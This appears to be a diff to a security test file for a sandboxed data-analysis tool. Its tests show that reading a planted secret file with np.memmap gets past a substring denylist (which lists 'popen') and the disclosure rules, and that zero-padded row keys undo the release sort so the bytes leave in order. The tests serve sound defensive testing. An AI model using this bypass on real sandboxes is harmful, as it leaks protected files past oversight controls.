@@ -53,13 +53,21 @@ def test_unlisted_numpy_file_readers_pass_the_static_check(call):
     assert static_check(f"result = pd.DataFrame({{'x': list({call})[:5]}})").ok
 
 
-def test_the_bypass_runs_and_the_disclosure_rules_have_no_objection(tmp_path):
+def test_the_bypass_runs_and_the_disclosure_rules_have_no_objection(tmp_path, monkeypatch):
     """End to end, on a planted file rather than a real one: the guard passes
     the code, the sandbox runs it, and the released frame is a small table with
-    innocent column names that no disclosure rule has any reason to stop."""
+    innocent column names that no disclosure rule has any reason to stop.
+
+    The file is referenced by its bare name from inside its directory, not by
+    absolute path: `static_check` is a substring denylist, and an absolute temp
+    path can incidentally contain a listed token (under `pytest-xdist` the
+    per-worker temp dirs are named `popen-gw*`, and `popen` is on the list) —
+    which would fail the check for a reason that has nothing to do with the code.
+    """
+    monkeypatch.chdir(tmp_path)
     secret = tmp_path / "secret.txt"
     secret.write_text("SUPER-SECRET-CONTENT\n")
-    code = (f"raw = np.memmap({str(secret)!r}, dtype='uint8', mode='r')\n"
+    code = ("raw = np.memmap('secret.txt', dtype='uint8', mode='r')\n"
             "result = pd.DataFrame({'x': [int(v) for v in raw[:20]]})\n")
 
     assert static_check(code).ok, "the denylist stopped it; re-check the bypass"
@@ -99,16 +107,20 @@ def test_the_legacy_path_is_not_reachable_from_anything_that_ships():
         assert "safetre.guards" not in source and "redteam.legacy" not in source
 
 
-def test_the_release_ordering_does_not_stop_the_bypass(tmp_path):
+def test_the_release_ordering_does_not_stop_the_bypass(tmp_path, monkeypatch):
     """Row re-ordering is not a defence, and should not be mistaken for one.
 
     `_finalize` sorts released rows on the rounded count then the cell key, so
     a naive byte dump comes back shuffled. Encoding a zero-padded position in
     the key makes that sort the identity, and the exact ordered contents leave.
+
+    The planted file is referenced by bare name from its own directory; see the
+    companion test for why an absolute temp path is not put through the denylist.
     """
+    monkeypatch.chdir(tmp_path)
     secret = tmp_path / "secret.txt"
     secret.write_text("ORDER-MATTERS-HERE\n")
-    code = (f"raw = np.memmap({str(secret)!r}, dtype='uint8', mode='r')\n"
+    code = ("raw = np.memmap('secret.txt', dtype='uint8', mode='r')\n"
             "vals = [int(v) for v in raw[:18]]\n"
             "result = pd.DataFrame({'k': ['%03d' % i for i in range(len(vals))],\n"
             "                       'x': vals, 'n': [50] * len(vals)})\n")
